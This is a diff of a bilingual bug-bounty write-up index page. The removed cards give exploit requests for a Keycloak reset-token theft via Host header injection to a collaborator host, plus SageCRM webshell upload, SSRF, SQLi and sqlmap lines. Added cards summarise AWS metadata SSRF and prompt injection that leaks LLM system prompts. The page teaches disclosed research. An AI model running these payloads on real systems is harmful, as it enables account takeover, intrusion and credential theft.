-      <div class="meta-item"><span class="meta-label">البرنامج:</span> <span class="meta-value">Private Program (Keycloak / HackerOne)</span></div>
-      <div class="meta-item"><span class="meta-label">الباحث:</span> <span class="meta-value"><a href="https://medium.com/@deepanshudev369/interesting-story-of-an-account-takeover-vulnerability-140a45a058a3" target="_blank">Deepanshu (golu369)</a></span></div>
-      <div class="meta-item"><span class="meta-label">Bounty:</span> <span class="meta-value">$2,000</span></div>
-    </div>
-
-    <h3 class="steps-title">خطوات الاستغلال</h3>
-    <ol class="steps-list">
-      <li>intercept forgot password request على Keycloak endpoint</li>
-      <li>Host header injection: appending collaborator URL at end لا يعمل — server يزيل .com ويُ attach company domain</li>
-      <li>prefix collaborator URL: <code>burp.oast.fun.login.company.com</code> — link يُ generate لكن unknown host</li>
-      <li>breakthrough: colon في Host header — <code>burp.oast.fun:login.company.com</code></li>
-      <li>server يُ generate password reset link pointing لـ collaborator URL مع valid token</li>
-      <li>HTTP pingback على Burp Collaborator → steal reset token → full ATO</li>
-    </ol>
-
-    <div class="cmd-ui-box">
-      <div class="cmd-ui-top">POST /auth/realms/target/login-actions/reset-credentials HTTP/1.1
-Host: abc.burpcollaborator.com:login.company.com
-Content-Type: application/x-www-form-urlencoded
-
-username=victim@email.com
-
-# Resulting reset link (token stolen via collaborator):
-# https://abc.burpcollaborator.com/auth/realms/.../action-token?key=eyJ...</div>
-      <div class="cmd-ui-bottom">
-        <button class="cmd-btn" onclick="copyText(this.previousElementSibling.textContent, this)">📋 Copy</button>
+      <span class="vuln-type-badge">SSRF</span>
+      <span class="vuln-type-badge">Cloud</span>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><span class="meta-label">الهدف:</span> <span class="meta-value">AWS Infrastructure</span></div>
+        <div class="meta-item"><span class="meta-label">المكافأة:</span> <span class="meta-value">$4,000</span></div>
       </div>
-    </div>
+      
+      <p>استغلال محرك توليد ملفات PDF غير آمن لاستدعاء خادم الميتا داتا 169.254.169.254 وتسريب مفاتيح AWS.</p>
 
-    <div class="tools-tags">
-      <span class="tool-tag">Burp Suite</span>
-      <span class="tool-tag">Burp Collaborator</span>
-      <span class="tool-tag">Keycloak</span>
-    </div>
-
-    <div class="lesson-box">
-      <h4>💡 الدرس المستفاد</h4>
-      <p>Host header parsing quirks = ATO. جرّب: prefix vs suffix injection، colon bypass، X-Forwarded-Host variants. Keycloak و similar auth systems حساسة لـ URL generation في password reset flows.</p>
-    </div>
-  </article>
-
-  <!-- ═══════════════════════════════════════════ -->
-  <!-- #9 HIGH — SageCRM Multi-CVE                  -->
-  <!-- ═══════════════════════════════════════════ -->
-  <article class="writeup-card high" id="wu-9" data-severity="high" data-tags="lfi sqli ssrf rce">
-    <div class="card-top">
-      <h2 class="card-title">SageCRM — LFI + SQLi + SSRF Chain (4 CVEs)</h2>
-      <span class="severity-badge badge-high">HIGH</span>
-    </div>
-    <span class="vuln-type-badge">LFI</span>
-    <span class="vuln-type-badge">SQLi</span>
-    <span class="vuln-type-badge">SSRF</span>
-    <span class="vuln-type-badge">RCE</span>
-
-    <div class="meta-grid">
-      <div class="meta-item"><span class="meta-label">البرنامج:</span> <span class="meta-value">Sage CRM (≤ 2023 R2)</span></div>
-      <div class="meta-item"><span class="meta-label">CVE:</span> <span class="meta-value">CVE-2023-47300/01/02/03</span></div>
-      <div class="meta-item"><span class="meta-label">الباحث:</span> <span class="meta-value"><a href="https://research.aurainfosec.io/disclosure/sagecrm2/" target="_blank">Aura Information Security</a></span></div>
-    </div>
-
-    <h3 class="steps-title">خطوات الاستغلال</h3>
-    <ol class="steps-list">
-      <li><strong>CVE-47300:</strong> Directory traversal في Print/Merge Preview — كتابة .asp webshell في webroot</li>
-      <li><strong>CVE-47303:</strong> Admin Data Upload — <code>filename="../../WWWRoot/CustomPages/shell.asp"</code></li>
-      <li><strong>CVE-47301:</strong> Unauthenticated SSRF via <code>/sdata/j/proxy?url=</code> — mirrors HTTP verbs including POST</li>
-      <li>SSRF → Apache SOLR (v6.1) → Velocity Template Injection → RCE</li>
-      <li><strong>CVE-47302:</strong> SQLi في Library Search — parameter <code>SearchSql</code> unsanitized — sqlmap confirmed</li>
-    </ol>
-
-    <div class="cmd-ui-box">
-      <div class="cmd-ui-top"># SSRF to internal SOLR
-GET /sdata/j/proxy?url=http://internal:8983/solr/admin/cores HTTP/1.1
-
-# Directory traversal upload
-Content-Disposition: form-data; name="DaUp_UploadFileName";
-  filename="../../WWWRoot/CustomPages/rce.asp"
-
-# SQLi in SearchSql parameter
-GET /crm/eware.dll/Do?SID={id}&amp;SearchSql=Libr_Global=N'Y' AND 1=1--&amp;...
-
-# sqlmap
-sqlmap -u "https://target/crm/eware.dll/Do?SearchSql=test*" --batch</div>
-      <div class="cmd-ui-bottom">
-        <button class="cmd-btn" onclick="copyText(this.previousElementSibling.textContent, this)">📋 Copy</button>
+      <div class="card-actions">
+        <a href="writeups/cloud-ssrf.html" class="back-btn">📖 Open Full Writeup / فتح التقرير كامل</a>
       </div>
-    </div>
+    </article>
 
-    <div class="tools-tags">
-      <span class="tool-tag">sqlmap</span>
-      <span class="tool-tag">Burp Suite</span>
-      <span class="tool-tag">Apache SOLR</span>
-    </div>
-
-    <div class="lesson-box">
-      <h4>💡 الدرس المستفاد</h4>
-      <p>Enterprise CRM apps = multiple attack vectors. chain SSRF → internal services → RCE. directory traversal في file upload شائع في legacy apps. test every user-controllable parameter in search/filter functions for SQLi.</p>
-    </div>
-  </article>
-
-  <!-- ═══════════════════════════════════════════ -->
-  <!-- #10 HIGH — PowerShell CLIXML Deserialization -->
-  <!-- ═══════════════════════════════════════════ -->
-  <article class="writeup-card high" id="wu-10" data-severity="high" data-tags="rce deserialization privesc">
-    <div class="card-top">
-      <h2 class="card-title">PowerShell CLIXML Deserialization — Hyper-V Guest-to-Host Breakout</h2>
-      <span class="severity-badge badge-high">HIGH</span>
-    </div>
-    <span class="vuln-type-badge">Deserialization</span>
-    <span class="vuln-type-badge">RCE</span>
-    <span class="vuln-type-badge">PrivEsc</span>
-
-    <div class="meta-grid">
-      <div class="meta-item"><span class="meta-label">البرنامج:</span> <span class="meta-value">PowerShell / Hyper-V / Windows</span></div>
-      <div class="meta-item"><span class="meta-label">CWE:</span> <span class="meta-value">CWE-502 (Untrusted Deserialization)</span></div>
-      <div class="meta-item"><span class="meta-label">الباحث:</span> <span class="meta-value"><a href="https://www.truesec.com/hub/blog/attacking-powershell-clixml-deserialization" target="_blank">Truesec (SEC-T 2024)</a></span></div>
-    </div>
-
-    <h3 class="steps-title">خطوات الاستغلال</h3>
-    <ol class="steps-list">
-      <li>PowerShell يستخدم CLIXML format عبر <code>Import-Clixml</code> / <code>[PSSerializer]::Deserialize()</code> — أي CLIXML غير موثوق = attack surface</li>
-      <li>CLIXML يدعم primitive types (<code>&lt;SBK&gt;</code> ScriptBlock) و complex types (<code>&lt;Obj&gt;</code>) — يمكن craft gadget chains</li>
-      <li>في Hyper-V scenario: guest يتحكم في CLIXML file يُ deserialize على الـ host عبر integration services</li>
-      <li>بعد deserialization، الـ object يُ rehydrate كـ property bag — gadget chain يُ trigger chain of function calls → code execution</li>
-      <li>الهجوم مرتبط بـ ProxyNotShell exploit chain في Exchange — لكن هنا يُ apply على PowerShell بشكل عام</li>
-      <li>MSRC أغلقت القضية كـ "fixed" لكن الهجوم ما زال ممكناً بدون mitigations مناسبة</li>
-    </ol>
-
-    <div class="cmd-ui-box">
-      <div class="cmd-ui-top"># Serialize / Deserialize cycle
-$myobject = "Hello World!"
-$myobject | Export-Clixml .\example.xml
-$deserialized = Import-Clixml .\example.xml
-
-# CLIXML with ScriptBlock primitive (SBK tag)
-&lt;Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"&gt;
-  &lt;SBK&gt;get-process&lt;/SBK&gt;
-&lt;/Objs&gt;
-
-# Programmatic deserialization
-$serialized = [System.Management.Automation.PSSerializer]::Serialize($obj)
-$deserialized = [System.Management.Automation.PSSerializer]::Deserialize($serialized)</div>
-      <div class="cmd-ui-bottom">
-        <button class="cmd-btn" onclick="copyText(this.previousElementSibling.textContent, this)">📋 Copy</button>
+    <!-- #4 High — Recon Mastery -->
+    <article class="writeup-card high" data-severity="high">
+      <div class="card-top">
+        <h2 class="card-title">Reconnaissance Mastery: Takeovers & Scans</h2>
+        <span class="severity-badge badge-high">HIGH</span>
       </div>
-    </div>
+      <span class="vuln-type-badge">Recon</span>
+      <span class="vuln-type-badge"> takeovers</span>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><span class="meta-label">الهدف:</span> <span class="meta-value">DNS Infrastructure</span></div>
+        <div class="meta-item"><span class="meta-label">المكافأة:</span> <span class="meta-value">$1,500</span></div>
+      </div>
+      
+      <p>شرح عملي لاكتشاف النطاقات الفرعية المعلقة وإجراء عمليات فحص المنافذ واستغلال ثغرات Subdomain Takeover.</p>
 
-    <div class="tools-tags">
-      <span class="tool-tag">PowerShell</span>
-      <span class="tool-tag">Import-Clixml</span>
-      <span class="tool-tag">Hyper-V</span>
-      <span class="tool-tag">YsoSerial.NET</span>
-    </div>
+      <div class="card-actions">
+        <a href="writeups/recon-mastery.html" class="back-btn">📖 Open Full Writeup / فتح التقرير كامل</a>
+      </div>
+    </article>
 
-    <div class="lesson-box">
-      <h4>💡 الدرس المستفاد</h4>
-      <p>deserialization في PowerShell CLIXML underestimated — مش بس Exchange. أي app يستدعي <code>Import-Clixml</code> على ملفات user-controlled = RCE. audit CLIXML files في Hyper-V guests، CI/CD artifacts، و shared storage. لا ت deserialize untrusted CLIXML أبداً.</p>
-    </div>
-  </article>
+    <!-- #5 High — Advanced JWT -->
+    <article class="writeup-card high" data-severity="high">
+      <div class="card-top">
+        <h2 class="card-title">Advanced JWT Forgery Attacks on Web Apps</h2>
+        <span class="severity-badge badge-high">HIGH</span>
+      </div>
+      <span class="vuln-type-badge">JWT</span>
+      <span class="vuln-type-badge">Authentication</span>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><span class="meta-label">الهدف:</span> <span class="meta-value">Auth System</span></div>
+        <div class="meta-item"><span class="meta-label">المكافأة:</span> <span class="meta-value">$2,000</span></div>
+      </div>
+      
+      <p>تجاوز طبقات الحقق من التوقيع بالـ JWT وتزوير توكنات المسؤولين.</p>
+
+      <div class="card-actions">
+        <a href="writeups/jwt-advanced.html" class="back-btn">📖 Open Full Writeup / فتح التقرير كامل</a>
+      </div>
+    </article>
+
+    <!-- #6 High — API Hacking -->
+    <article class="writeup-card high" data-severity="high">
+      <div class="card-top">
+        <h2 class="card-title">API Hacking: Bypassing OAuth and IDOR</h2>
+        <span class="severity-badge badge-high">HIGH</span>
+      </div>
+      <span class="vuln-type-badge">APIs</span>
+      <span class="vuln-type-badge">IDOR</span>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><span class="meta-label">الهدف:</span> <span class="meta-value">API Endpoint</span></div>
+        <div class="meta-item"><span class="meta-label">المكافأة:</span> <span class="meta-value">$2,500</span></div>
+      </div>
+      
+      <p>استغلال ثغرات تخطي التحقق من الصلاحيات BOLA وتعديل حسابات المستخدمين الآخرين.</p>
+
+      <div class="card-actions">
+        <a href="writeups/api-hacking.html" class="back-btn">📖 Open Full Writeup / فتح التقرير كامل</a>
+      </div>
+    </article>
+
+    <!-- #7 High — Race Conditions -->
+    <article class="writeup-card high" data-severity="high">
+      <div class="card-top">
+        <h2 class="card-title">Race Conditions in Payment Gateways</h2>
+        <span class="severity-badge badge-high">HIGH</span>
+      </div>
+      <span class="vuln-type-badge">Race Conditions</span>
+      <span class="vuln-type-badge">Billing</span>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><span class="meta-label">الهدف:</span> <span class="meta-value">Payment Gateway</span></div>
+        <div class="meta-item"><span class="meta-label">المكافأة:</span> <span class="meta-value">$3,500</span></div>
+      </div>
+      
+      <p>إرسال طلبات متزامنة في نفس اللحظة لشراء منتجات مجانية أو تكرار استبدال القسائم.</p>
+
+      <div class="card-actions">
+        <a href="writeups/race-payments.html" class="back-btn">📖 Open Full Writeup / فتح التقرير كامل</a>
+      </div>
+    </article>
+
+    <!-- #8 Medium — GraphQL Introspection -->
+    <article class="writeup-card medium" data-severity="medium">
+      <div class="card-top">
+        <h2 class="card-title">GraphQL Schema Leakage & Introspection Bypasses</h2>
+        <span class="severity-badge badge-medium">MEDIUM</span>
+      </div>
+      <span class="vuln-type-badge">GraphQL</span>
+      <span class="vuln-type-badge">Introspection</span>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><span class="meta-label">الهدف:</span> <span class="meta-value">GraphQL API</span></div>
+        <div class="meta-item"><span class="meta-label">المكافأة:</span> <span class="meta-value">$1,200</span></div>
+      </div>
+      
+      <p>تجميع مخطط وهيكل قاعدة البيانات بالكامل باستغلال ميزة Introspection Queries.</p>
+
+      <div class="card-actions">
+        <a href="writeups/graphql-attack.html" class="back-btn">📖 Open Full Writeup / فتح التقرير كامل</a>
+      </div>
+    </article>
+
+    <!-- #9 Medium — AI Prompt Injection -->
+    <article class="writeup-card medium" data-severity="medium">
+      <div class="card-top">
+        <h2 class="card-title">AI Prompt Injection & Prompt Leaking</h2>
+        <span class="severity-badge badge-medium">MEDIUM</span>
+      </div>
+      <span class="vuln-type-badge">AI Security</span>
+      <span class="vuln-type-badge">LLM</span>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><span class="meta-label">الهدف:</span> <span class="meta-value">LLM Chatbot</span></div>
+        <div class="meta-item"><span class="meta-label">المكافأة:</span> <span class="meta-value">$800</span></div>
+      </div>
+      
+      <p>خداع نماذج اللغة الضخمة (LLMs) وإرغامها على تسريب تعليمات النظام الداخلية والمفاتيح.</p>
+
+      <div class="card-actions">
+        <a href="writeups/ai-prompt-inj.html" class="back-btn">📖 Open Full Writeup / فتح التقرير كامل</a>
+      </div>
+    </article>
+
+    <!-- #10 Medium — Linux SUID PrivEsc -->
+    <article class="writeup-card medium" data-severity="medium">
+      <div class="card-top">
+        <h2 class="card-title">Linux Local Privilege Escalation via SUID</h2>
+        <span class="severity-badge badge-medium">MEDIUM</span>
+      </div>
+      <span class="vuln-type-badge">Linux</span>
+      <span class="vuln-type-badge">PrivEsc</span>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><span class="meta-label">الهدف:</span> <span class="meta-value">Alpine Linux Host</span></div>
+        <div class="meta-item"><span class="meta-label">المكافأة:</span> <span class="meta-value">$1,000</span></div>
+      </div>
+      
+      <p>استغلال الملفات المساعدة التي تعمل بصلاحيات root لعمل حقن PATH وترقية الصلاحيات.</p>
+
+      <div class="card-actions">
+        <a href="writeups/linux-suid-root.html" class="back-btn">📖 Open Full Writeup / فتح التقرير كامل</a>
+      </div>
+    </article>
 
   </div><!-- /writeupsList -->
 
-<script>
-  function copyText(text, btn) {
-    navigator.clipboard.writeText(text.trim()).then(function() {
-      var orig = btn.innerText;
-      btn.innerText = '✓ Copied!';
-      btn.classList.add('copied');
-      setTimeout(function() {
-        btn.innerText = orig;
-        btn.classList.remove('copied');
-      }, 2000);
-    });
-  }
+</div>
 
+<script>
   (function() {
     var cards = document.querySelectorAll('.writeup-card');
     var searchInput = document.getElementById('wuSearch');
@@ -1029,9 +549,8 @@ $deserialized = [System.Management.Automation.PSSerializer]::Deserialize($serial
 
       cards.forEach(function(card) {
         var severity = card.getAttribute('data-severity') || '';
-        var tags = (card.getAttribute('data-tags') || '').toLowerCase();
         var text = card.textContent.toLowerCase();
-        var matchSeverity = activeFilter === 'all' || severity === activeFilter || tags.indexOf(activeFilter) !== -1;
+        var matchSeverity = activeFilter === 'all' || severity === activeFilter;
         var matchSearch = !query || text.indexOf(query) !== -1;
         var show = matchSeverity && matchSearch;
 
